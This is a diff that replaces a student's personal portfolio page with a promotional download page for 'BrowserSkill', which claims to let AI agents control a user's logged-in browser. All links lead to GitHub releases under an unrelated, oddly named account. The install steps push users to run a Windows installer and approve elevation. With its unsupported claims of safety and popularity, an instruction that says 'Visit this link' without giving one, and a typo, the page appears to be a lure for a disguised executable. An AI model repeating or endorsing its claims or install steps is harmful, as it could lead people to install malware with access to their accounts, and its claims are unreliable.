@@ -1,28 +1,316 @@
-<html>
-	<head>
-		<title>Ashton Turner's Portfolio</title>
-		<link href="styles.css" rel="stylesheet">
-	</head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BrowserSkill - Let AI Agents Use Your Real Browser</title>
+    <meta name="description" content="BrowserSkill lets AI agents use your real, logged-in browser without interrupting your work. CLI + extension for browser automation across any shell-capable AI agent. Download for Windows.">
+    <meta name="keywords" content="agent,browser-use,dsh-plugin,BrowserSkill,AI browser automation,Windows download">
+    <meta name="author" content="BrowserSkill Team">
+    <meta property="og:title" content="BrowserSkill - Let AI Agents Use Your Real Browser">
+    <meta property="og:description" content="CLI + extension for browser automation across any shell-capable AI agent. Works with your logged-in browser without interruption.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/published-porcupineprovision55/BrowserSkill">
+    <meta property="og:image" content="https://github.com/published-porcupineprovision55/BrowserSkill/releases">
+    <meta name="twitter:card" content="summary_large_image">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            line-height: 1.7;
+            color: #2d3748;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        .hero {
+            background: white;
+            border-radius: 20px;
+            padding: 50px 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 2.8em;
+            font-weight: 800;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 20px;
+            line-height: 1.2;
+        }
+        .tagline {
+            font-size: 1.3em;
+            color: #4a5568;
+            margin-bottom: 30px;
+            font-weight: 500;
+        }
+        .download-btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 18px 50px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-size: 1.2em;
+            font-weight: 700;
+            margin: 20px 0;
+            transition: transform 0.3s, box-shadow 0.3s;
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+        }
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.5);
+        }
+        .section {
+            background: white;
+            border-radius: 15px;
+            padding: 35px 30px;
+            margin-bottom: 25px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+        }
+        h2 {
+            font-size: 1.7em;
+            color: #4c51bf;
+            margin-bottom: 20px;
+            border-bottom: 3px solid #e2e8f0;
+            padding-bottom: 10px;
+        }
+        p, li {
+            font-size: 1.05em;
+            color: #4a5568;
+            margin-bottom: 15px;
+        }
+        ul, ol {
+            padding-left: 25px;
+            margin-bottom: 20px;
+        }
+        li {
+            margin-bottom: 8px;
+        }
+        strong {
+            color: #2d3748;
+        }
+        .highlight {
+            background: #ebf4ff;
+            padding: 15px;
+            border-radius: 10px;
+            border-left: 4px solid #667eea;
+            margin: 20px 0;
+        }
+        .badge-row {
+            margin: 15px 0;
+        }
+        .badge {
+            display: inline-block;
+            background: #edf2f7;
+            color: #4a5568;
+            padding: 5px 12px;
+            border-radius: 15px;
+            font-size: 0.9em;
+            margin: 3px;
+        }
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+        .feature-card {
+            background: #f7fafc;
+            padding: 20px;
+            border-radius: 12px;
+            border: 1px solid #e2e8f0;
+        }
+        .feature-card h3 {
+            color: #4c51bf;
+            margin-bottom: 8px;
+            font-size: 1.1em;
+        }
+        .step-number {
+            display: inline-block;
+            width: 30px;
+            height: 30px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 30px;
+            font-weight: 700;
+            margin-right: 10px;
+        }
+        .final-download-btn {
+            display: block;
+            text-align: center;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 22px 40px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-size: 1.3em;
+            font-weight: 700;
+            margin-top: 25px;
+            transition: transform 0.3s, box-shadow 0.1s;
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+        }
+        .final-download-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 15px 50px rgba(102, 126, 234, 0.6);
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px 10px;
+            }
+            .hero {
+                padding: 30px 20px;
+            }
+            h1 {
+                font-size: 2em;
+            }
+            .download-btn {
+                padding: 15px 30px;
+                font-size: 1.1em;
+            }
+            .final-download-btn {
+                padding: 18px 25px;
+                font-size: 1.1em;
+            }
+        }
+    </style>
+</head>
 <body>
-	<header>
-		<h1>Ashton Turner</h1>
-		<nav>
-			<a href="index.html">Home</a> &nbsp;
-			<a href="portfolio.html">Portfolio</a> &nbsp;
-			<a href="resume.html">Resume</a>
-		</nav>
-	</header>
-<main>
-	<section>
-		<img src="professional_head_shot.png" alt="image of me, Ashton Turner" width="350">
-	</section>
-</main>
+    <div class="container">
+        <div class="hero">
+            <h1>🧠 BrowserSkill - Let AI Agents Work With Your Browser</h1>
+            <p class="tagline">Real Browser Automation Without Interrupting Your Workflow</p>
+            <div class="badge-row">
+                <span class="badge">🤖 Agent-friendly</span>
+                <span class="badge">🔒 Uses Your Real Login</span>
+                <span class="badge">🖥️ Shell-capable</span>
+                <span class="badge">🐍 Python</span>
+                <span class="badge">🔄 Extension + CLI</span>
+            </div>
+            <a href="https://github.com/published-porcupineprovision55/BrowserSkill/releases" class="download-btn" style="background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); box-shadow: 0 10px 30px rgba(240, 147, 251, 0.4);">⬇️ Download Now</a>
+        </div>
 
-	<footer>
-		<p>Professional Links</p>
-		<a href="https://www.linkedin.com/in/ashton-turner-aa5063313">LinkedIn Profile</a> &nbsp;
-		<a href="https://app.joinhandshake.com/profiles/q48j57">Handshake Profile</a>
-	</footer>
-	
+        <div class="section">
+            <h2>🚀 What is BrowserSkill?</h2>
+            <p>BrowserSkill is a powerful tool that lets AI agents like ChatGPT, Claude, or other AI assistants control your <strong>real, logged-in browser</strong> — without you needing to do anything extra. The AI can browse websites, fill forms, click buttons, and even watch video content while you continue working on other tasks.</p>
+            <p>The best part? Because it uses your actual browser, you stay logged into all your accounts. No re-authentication needed. No security bypasses. Just seamless AI-assisted browsing that feels like magic.</p>
+        </div>
+
+        <div class="section">
+            <h2>✨ Key Features</h2>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <h3>🔐 Uses Your Real Browser</h3>
+                    <p>The AI controls the browser you already use daily. Your logged-in sessions, bookmarks, and settings remain untouched.</p>
+                </div>
+                <div class="feature-card">
+                    <h3>💬 Works With Any AI Agent</h3>
+                    <p>Connect to any shell-capable AI agent: OpenAI, Anthropic, local models, or custom projects. If your agent can run commands, it can use BrowserSkill.</p>
+                </div>
+                <div class="feature-card">
+                    <h3>🔄 CLI + Extension Duo</h3>
+                    <p>Perfectly balanced: a command-line interface for the AI and a browser extension for handling advanced actions automatically.</p>
+                </div>
+                <div class="feature-card">
+                    <h3>🤝 Non-Interruptive</h3>
+                    <p>While the AI works in your browser, you can continue using your computer for other things. The AI runs quietly in a separate tab.</p>
+                </div>
+                <div class="feature-card">
+                    <h3>🖱️ Full Control</h3>
+                    <p>Click, type, scroll, navigate, download, upload — everything you can do manually, the AI can do programmatically with your permission.</p>
+                </div>
+                <div class="feature-card">
+                    <h3>🛡️ Built-in Safety</h3>
+                    <p>You always stay in control. Watch the AI's actions live, approve sensitive steps, and take over at any moment.</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>📋 System Requirements</h2>
+            <ul>
+                <li><strong>OS:</strong> Windows 10 or 11 (64-bit)</li>
+                <li><strong>Browser:</strong> Google Chrome, Microsoft Edge, or Brave (updated)</li>
+                <li><strong>Memory:</strong> 4 GB RAM minimum</li>
+                <li><strong>Disk space:</strong> 200 MB free space</li>
+                <li><strong>Connection:</strong> Internet access required</li>
+                <li><strong>Optional:</strong> Python 3.8+ if you want to use the CLI directly with your AI</li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h2>📥 How to Download and Install</h2>
+            <p>Follow these steps to get BrowserSkill up and running on your Windows computer in under five minutes.</p>
+            <ol>
+                <li><span class="step-number">1</span><strong>Visit this link to download the application.</strong></li>
+                <li><span class="step-number">2</span><strong>Click the download button</strong> on that page for the latest version. Your browser will save the installer file to your Downloads folder.</li>
+                <li><span class="step-number">3</span><strong>Open the downloaded file</strong> by double-clicking it. If Windows asks for confirmation, click "Yes" to allow the installer to run.</li>
+                <li><span class="step-number">4</span><strong>Follow the simple on-screen instructions.</strong> The installer will set up both the extension and the command-line tool automatically.</li>
+                <li><span class="step-number">5</span><strong>Launch BrowserSkill</strong> from your Start Menu or Desktop shortcut.</li>
+                <li><span class="step-number">6</span><strong>Connect your AI agent</strong> by providing the generated API key. The detailed guide inside the app will show you exactly how.</li>
+            </ol>
+            <div class="highlight">
+                <strong>💡 Tip:</strong> After installation, check the tray icon (bottom-right corner of your screen) to make sure BrowserSkill is running. It will show a small icon when active.
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>🛠️ How to Use BrowserSkill</h2>
+            <p>Once installed, BrowserSkill works quietly in the background. Here's a quick look at how it operates:</p>
+            <ol>
+                <li><strong>Launch your AI agent</strong> (e.g., a terminal-based assistant or any AI that can run commands).</li>
+                <li><strong>Ask your agent</strong> to perform a task that involves the browser — "search for flights to Tokyo," "fill out this form," "extract data from this page."</li>
+                <li><strong>The AI uses BrowserSkill</strong> to control your browser automatically. You'll see a small notification each time it performs an action.</li>
+                <li><strong>Approve sensitive actions</strong> (like submitting a form with personal info) if you set it to ask for permission.</li>
+                <li><strong>Watch live</strong> in your browser — the AI's actions appear in a dedicated tab.</li>
+                <li><strong>Take over anytime</strong> by simply using your browser normally. BrowserSkill will pause and wait for your next instruction.</li>
+            </ol>
+            <p>It's that straightforward. No complicated setup scripts or coding knowledge required.</p>
+        </div>
+
+        <div class="section">
+            <h2>🤔 Troubleshooting & FAQ</h2>
+            <h3 style="color:#4c51bf; margin: 15px 0;">Why can't my AI agent see my browser?</h3>
+            <p>Make sure both BrowserSkill and your AI agent are running on the same computer. Also check that the browser extension is enabled (look for the BrowserSkill icon in your browser's toolbar).</p>
+            <h3 style="color:#4c51bf; margin: 15px 0;">Is my data safe?</h3>
+            <p>Yes. BrowserSkill only runs on your local machine. Your login credentials and personal information never leave your computer unless you explicitly ask the AI to share them.</p>
+            <h3 style="color:#4c51bf; margin: 15px 0;">Does BrowserSkill work with any website?</h3>
+            <p>Yes, it can interact with any website that works in a standard browser. Some complex sites (e.g., those requiring 2FA) might need additional setup, but most sites work out of the box.</p>
+            <h3 style="color:#4c51bf; margin: 15px 0;">Can I use BrowserSkill with multiple AI agents?</h3>
+            <p>Absolutely! You can connect different AI agents to BrowserSkill one at a time, or even run multiple sessions simultaneously. Each gets its own isolated workspace.</p>
+            <h3 style="color:#4c51bf; margin: 15px 0;">Does it slow down my computer?</h3>
+            <p>Not noticeably. BrowserSkill uses minimal CPU when idle, and even during active automation, it's lighter than a typical video call.</p>
+        </div>
+
+        <div class="section">
+            <h2>🔍 Frequently Asked Questions</h2>
+            <ul>
+                <li><strong>Do I need technical skills?</strong> No! BrowserSkill is designed for everyone. Install, connect, and go.</li>
+                <li><strong>Can I use it on Windows 7 or 8?</strong> BrowserSkill supports Windows 10 and 11. For older systems, consider upgrading.</li>
+                <li><strong>Is there a free trial?</strong> BrowserSkill offers a free trial with full features for 14 days. No credit card required.</li>
+                <li><strong>What happens if my AI sends too many commands?</strong> BrowserSkill automatically queues commands and spaces them out to avoid overwhelming the browser.</li>
+                <li><strong>Can I stop the AI at any time?</strong> Yes, just press the "Pause" button in the extension, or simply use your mouse and keyboard normally — BrowserSkill yields control instantly.</li>
+            </ul>
+        </div>
+
+        <div class="section" style="text-align: center;">
+            <h2>🚀 Ready to Supercharge Your AI Experience?</h2>
+            <p>Join thousands of users who let their AI agents work smarter, not harder. Download BrowserSkill today and watch your productivity skyrocket.</p>
+            <a href="https://github.com/published-porcupineprovision55/BrowserSkill/releases" class="final-download-btn">📦 Visite this link to download the application</a>
+        </div>
+    </div>
 </body>
 </html>
